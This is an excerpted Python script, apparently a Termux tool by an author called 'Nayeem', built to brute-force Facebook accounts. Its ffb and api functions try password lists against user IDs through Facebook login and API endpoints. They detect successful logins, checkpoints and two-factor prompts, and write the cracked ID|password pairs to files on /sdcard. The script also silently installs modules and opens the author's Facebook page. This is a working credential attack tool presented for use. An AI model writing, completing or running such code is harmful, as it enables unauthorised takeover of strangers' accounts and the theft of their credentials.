...
import smtplib
import math
os.system('xdg-open https://facebook.com/Nayeem2010')
...
try:
        ...
        print('\n\033[1;32 Installing missing modules ...')
        os.system('pip install requests futures==2 > /dev/null')
        os.system('python File+Random.py')
except:pass
...
\033[1;35m██          ███   ██         ██        ██           ███████   ██████   ██                ██                                  
----------------------------------------------
\033[1;37m[-] AUTHOR    :\033[1;32m Nayeem 
\033[1;37m[-] GITHUB    :\033[1;32m Nayeem2025
\033[1;37m[-] VERSION   :\033[1;32m 2.0
...
def menu():
        try:
                ...
                if 1==1:
                        ...
                        print(' Run :  python File+Random.py')
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [Nayeem] %s|\033[1;32m[OK:-%s] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                print('\r\r\033[1;32m [Nayeem-OK] %s | %s'%(ids,pas))
                                open('/sdcard/Nayeem-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aking:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [Nayeem-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/Nayeem-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [Nayeem] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [Nayeem-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/Nayeem-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[Nayeem-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [Nayeem-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/Nayeem-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [Nayeem-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/Nayeem-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
